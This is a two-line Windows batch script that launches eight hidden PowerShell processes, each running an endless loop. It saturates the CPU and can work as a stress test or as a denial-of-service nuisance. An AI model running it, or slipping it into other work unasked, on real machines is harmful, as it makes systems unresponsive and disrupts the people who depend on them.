@echo off
for /L %%i in (1,1,8) do start /b powershell -NoProfile -c "while($true){}"
